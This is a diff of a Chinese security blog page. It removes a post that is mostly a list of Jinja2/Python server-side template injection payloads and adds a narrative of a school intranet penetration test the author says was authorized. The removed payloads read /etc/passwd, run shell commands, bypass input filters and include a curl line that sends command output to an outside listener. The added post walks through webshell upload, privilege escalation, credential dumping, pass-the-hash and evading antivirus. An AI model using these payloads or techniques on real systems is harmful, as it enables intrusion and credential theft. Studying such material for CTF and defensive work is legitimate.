@@ -4,7 +4,7 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="SSTI模板注入payload记录, Fortheone">
+    <meta name="keywords" content="学校内网再测试, Fortheone">
     <meta name="description" content>
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>SSTI模板注入payload记录 | Fortheone</title>
+    <title>学校内网再测试 | Fortheone</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -281,12 +281,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">SSTI模板注入payload记录</h1>
+                    <h1 class="description center-align post-title">学校内网再测试</h1>
                 </div>
             </div>
         </div>
@@ -411,8 +411,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/总结记录/" class="post-category">
-                                总结记录
+                            <a href="/categories/渗透测试/" class="post-category">
+                                渗透测试
                             </a>
                         
                     </div>
@@ -424,7 +424,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-01-03
+                    2020-07-22
                 </div>
                 
 
@@ -433,14 +433,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    756
+                    1.6k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    3 分
+                    5 分
                 </div>
                 
 
@@ -456,90 +456,47 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <img src="https://raw.githubusercontent.com/Yiyangqianxixxxx/img/master/ctfjennie1.jpg" width="80%">
-<a id="more"></a>
-<h3 id="0x00前言">0x00前言</h3>
-<p>模板注入也算比较老的东西了，但是偶尔可能会碰到，所以就在这里记录一些bypass方法和一些特殊的payload。</p>
-<p>基本的魔术方法</p>
-<pre><code>__class__  返回类型所属的对象
-__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
-__base__   返回该对象所继承的基类
-// __base__和__mro__都是用来寻找基类的
-
-__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
-__init__  类的初始化方法
-__globals__  对包含函数全局变量的字典的引用
-</code></pre>
-<h3 id="0x01常见的一些payload">0x01常见的一些payload</h3>
-<p>这里多数都是通过先获取到object对象，然后找到file引用来读取文件。</p>
-<pre><code>''.__class__.__mro__[2]
-{}.__class__.__bases__[0]
-().__class__.__bases__[0]
-[].__class__.__bases__[0]
-request.__class__.__mro__[8]    //(jinja2中存在request对象)
-</code></pre>
-<p>上面的语句都可以获得object对象，然后通过object对象列出可调用的引用列表，找到可用的引用。</p>
-<pre><code>object.__subclasses__()[40]('/etc/passwd').read()     //file类读取文件
-object.__subclasses__()[40]('/tmp').write('test')     //file类写文件
-
-object..__subclasses__()[59].__init__.func_globals['linecache'].os.system('whoami')     //os类执行命令
-
-object.__subclasses__()[59].__init__.func_globals['linecache'].os.popen('ls').read()      //os类执行命令
-
-{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('ls').read()                                        //os类执行命令              
-</code></pre>
-<h3 id="0x02-bypass">0x02 bypass</h3>
-<h4 id="1、过滤">1、过滤[</h4>
-<pre><code>''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read()                            //读文件
-
-''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen('ls').read()                //执行命令
-</code></pre>
-<h4 id="2、过滤引号">2、过滤引号</h4>
-<pre><code>{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}{{ ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() }}
-//先获取chr()函数，赋值给chr，然后用chr拼接出要读取的文件名
-
-
-().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() }}&amp;path=/etc/passwd
-//要使用到request对象，在jinja2中可使用
-
-//执行命令
-{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}{{ ().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() }}
-
-
-().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() }}&amp;cmd=id
-</code></pre>
-<h4 id="3、过滤双下划线">3、过滤双下划线</h4>
-<pre><code>{{ ''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__
-//也要用到request对象
-</code></pre>
-<h4 id="4、过滤大括号">4、过滤大括号</h4>
-<pre><code>{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' %}1{% endif %}
-//利用curl将结果外带
-```
-
-
-
-#### 5、过滤了class 或者 subclasses
-
-利用 'subcla'+'sses'绕过
-
-其他的字符串过滤了也可以使用这种拼接的方式绕过
-
-
-
-#### 其他的一些payload
-
-```
-().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls").read()' )
-
-session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]         //可以获取到object对象，再根据序列号选择file或os类
-
-{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['__import__']('os').popen('ls').read() }}{% endif %}{% endfor %}
-
-</code></pre>
-<h3 id="0x03-参考文章">0x03 参考文章</h3>
-<p><a href="https://p0sec.net/index.php/archives/120/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/120/</a></p>
-<p><a href="https://evi0s.com/2018/11/26/%E6%B7%B1%E5%85%A5ssti-%E4%BB%8Enctf2018%E4%B8%A4%E9%81%93flask%E7%9C%8Bbypass%E6%96%B0%E5%A7%BF%E5%8A%BF/" target="_blank" rel="noopener">https://evi0s.com/2018/11/26/%e6%b7%b1%e5%85%a5ssti-%e4%bb%8enctf2018%e4%b8%a4%e9%81%93flask%e7%9c%8bbypass%e6%96%b0%e5%a7%bf%e5%8a%bf/</a></p>
+                <h2 id="初探内网"><strong>初探内网</strong></h2>
+<p>在向信息中心的老师申请了对学校进行一次内网渗透测试的授权之后，我开始着手对学校内网中在用系统进行了一波信息搜集。其中大部分都使用了新版的未爆出0day的框架组件，这让我一开始的打点过程陷入僵局。但是在我重新翻了一遍学校开放的各种web系统后，我发现了一些令人惊喜的系统。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/wps1.jpg" alt></p>
+<p>学校使用了很多新系统，但是并没有把老系统关闭，经过一番搜索确定了这个老系统存在任意文件上传漏洞。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/wps2.jpg" alt></p>
+<p>没有任何过滤，可以说就是捡漏了。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/wps3.jpg" alt></p>
+<p>而且也返回了一句话木马的路径。但是我遇到了一个很奇怪的现象，用蚁剑和用菜刀连接后，返回的路径不一样，其中的文件也不一样。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/wps4.jpg" alt></p>
+<p>其中蚁剑连接的shell无法上传文件，而菜刀连接的却可以，并且webshell执行一次命令后就会封禁IP，怀疑有waf。所以我先传了一个msf的aspx木马来获取一个meterpreter的会话。使用windows-exploit-suggest探测未打的补丁。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/wps5.jpg" alt></p>
+<p>发现存在MS16-075这个非常好用的漏洞，直接配合msf的juicy_potato模块来攻击，记住要修改CLSID，可以在这里找</p>
+<p><a href="https://github.com/ohpe/juicy-potato/tree/master/CLSID" target="_blank" rel="noopener">https://github.com/ohpe/juicy-potato/tree/master/CLSID</a></p>
+<p>使用的payload最好要选择正向连接 bind_tcp，不然有可能弹不回来shell。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/wps6.jpg" alt></p>
+<p>这样就获取了system权限。接下来就是对机器进行信息搜集，获取对我们横向渗透有帮助的信息。很奇怪的一点是，这台机器本来是有域的，但现在却没有了，且无法找到域控。所以我们的重点放在密码撞库。使用msf自带的mimikatz模块来获取密码。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/wps7.jpg" alt></p>
+<p>撞到了两三台机器，还有一些机器是开着445端口，但没有开3389端口。</p>
+<p>这样我们可以尝试使用ms-17010，但考虑可能会对某些正在使用的系统造成影响，我还是选择使用更稳妥的 psexec模块来进行撞库。也就是哈希传递，有时候我们碰到无法获取明文的密码，可以考虑dump出密码的hash值，再使用psexec模块进行哈希传递，来进行攻击，获取到的都是SYSTEM权限。</p>
+<p>后面的步骤索然无味，就是不断的撞库搜集密码，然后再通过搜集的密码再撞库，获取到了足够多的机器和密码之后，找到了边界路由器，但是之前搜集的密码都无法成功登录，只好放弃。这个网段就告一段落。</p>
+<h2 id="深入探索"><strong>深入探索</strong></h2>
+<p>经过对新系统的一番搜索，我在其中的一个功能中找到了任意文件下载漏洞。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/wps8.jpg" alt></p>
+<p>并且是root用户起的服务，最理想的情况就是，读取/etc/shadow文件，爆破root用户密码。（失败），然后尝试读取/root/.bash_history 来获取root用户的操作历史记录。其中记录了tomcat部署的路径，以及备份的源码文件。通过下载源码进行信息搜集，我搜集到了一个很关键的信息，这个网段的机器大多数使用oracle数据库，并且没有修改SID，手里还有几个可以尝试的密码。</p>
+<p>经过一番爆破，发现了一台机器oracle数据库system用户密码未修改，为manager。大家应该指定oracle数据库是可以执行系统命令的，而system用户完全符合执行系统命令的条件。网上找到一个工具，去掉了繁琐的步骤，可以直接执行命令。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/wps9.jpg" alt></p>
+<h2 id="绕过火绒行为检测"><strong>绕过火绒行为检测</strong></h2>
+<p>但是又出现了一个很奇怪的问题，我只能执行少数的几个命令，虽然我是system用户，但我一旦使用到 net user之类的命令时，就没有了回显。后面发现是火绒拦截了异常行为。然后我尝试了直接使用 navicat 中的sqlplus来连接服务器。根据网上的步骤建立执行命令的代码，我可以根据服务器返回的1或0来判断命令是否执行。</p>
+<p>因为存在杀毒软件监控oracle的行为，所以得要通过一些不被拦截的行为来组合起来攻击。</p>
+<p>让我没想到的是，当我直接执行命令行开启3389端口时，火绒居然没有拦截。但当我执行net user等命令的时候又无法执行。这时候我突然想起来guest用户，我启用guest用户，然后加入管理员组，这一次没有被拦截。直接远程桌面连接以后，当我想在机器上使用mimikatz或者是反弹一个shell到cs上都失败了。</p>
+<p>并且guest用户还有一些权限被禁用了，比如添加用户等敏感操作。但是我执行net user的时候发现了一个用户，这个用户我在之前的机器上见过，并且我有这个用户的密码。所以再通过sqlplus来将这个用户加入管理员组。</p>
+<p>所以火绒拦截的行为规则就是不能添加用户，但是可以把已存在的用户加入管理员组，并且guest用户可激活，可开3389。在我再次登录这个机器之后，还是没有办法反弹shell回来，或者是读出它的密码。这时候学弟和我说，可以直接打开火绒，关闭防护，就可以反弹shell了。我？？？？？</p>
+<p>然后一通操作拿到了shell，但是还是读不出明文密码，我就想着把哈希dump出来然后去爆破。但是又想起来有一个国外的在线网站可以解NTLM</p>
+<p><a href="https://www.objectif-securite.ch/ophcrack" target="_blank" rel="noopener">https://www.objectif-securite.ch/ophcrack</a></p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/wps10.jpg" alt></p>
+<p>获取密码之后，又是熟悉的撞库，信息搜集，再撞库。</p>
+<p>然后在服务器上发现了一个xftp保存了几台服务器的密码，这个时候发现一个骚操作，可以用一个星号密码查看器的工具，来查看这里保存的密码。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/wps11.jpg" alt></p>
+<p>又喜提几台root权限的机器。后面要考试就不想玩了，把所有搜集的密码用户记录，然后撞整个网段的机器，撞出了很多弱口令。</p>
+<p><img src="https://blogpicture-fortheone.oss-cn-shanghai.aliyuncs.com/img/wps14.jpg" alt></p>
+<p>恭喜信息中心老师喜提加班。</p>
 
             </div>
             <hr>
@@ -565,7 +522,7 @@ session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]     
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://yoursite.com/year/01/03/ssti/">http://yoursite.com/year/01/03/ssti/</a>
+                    <a href="http://yoursite.com/year/07/22/学校内网再测试/">http://yoursite.com/year/07/22/学校内网再测试/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1031,43 +988,42 @@ session['__cla'+'ss__'].__bases__[0].__bases__[0].__bases__[0].__bases__[0]     
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/year/03/04/JavaScript/">
+                <a href="/year/07/22/学校内网再测试/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="回炉重造计划——JavaScript学习小结">
+                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="学校内网再测试">
                         
-                        <span class="card-title">回炉重造计划——JavaScript学习小结</span>
+                        <span class="card-title">学校内网再测试</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            JavaScript中的基础语法就不做记录了，大多数会在后面的漏洞分析中记录。
-0x00 JavaScript继承机制
-在JavaScript中，几乎所有的事物都是对象。
-创造对象的方法：
-var o = {a:1,b:2};       
+                            初探内网
+在向信息中心的老师申请了对学校进行一次内网渗透测试的授权之后，我开始着手对学校内网中在用系统进行了一波信息搜集。其中大部分都使用了新版的未爆出0day的框架组件，这让我一开始的打点过程陷入僵局。但是在我重新翻了一遍学校开放的各种w
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-03-04
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-07-22
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/总结记录/" class="post-category">
-                                    总结记录
+                            <a href="/categories/渗透测试/" class="post-category">
+                                    渗透测试
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -1078,34 +1034,38 @@ var o = {a:1,b:2};
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/year/12/14/SWPUCTF/">
+                <a href="/year/07/22/apacheshiro复现/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="SWPUCTF2019复现">
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="Apache shiro反序列化漏洞复现">
                         
-                        <span class="card-title">SWPUCTF2019复现</span>
+                        <span class="card-title">Apache shiro反序列化漏洞复现</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            SWPUCTF进行的时候刚好在打省赛，所以没有去做题目，只能赛后来看看题目，学习一点新姿势。
+                            漏洞环境搭建
+https://vulhub.org/#/environments/shiro/CVE-2016-4437/
+直接使用docker搭建vulhub里的shiro靶场就可以了。
+启动后
 
-0x00 web1
-web1是一个二次注入的题目，因为其中过滤了or，所以常用的information_schema就不能用了，但是可以用之前上
+登录抓包
+
+可以在响应包中看到有 rem
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2019-12-14
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-07-22
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/CTF/" class="post-category">
-                                    CTF
+                            <a href="/categories/总结记录/" class="post-category">
+                                    总结记录
                                 </a>
                             
                             
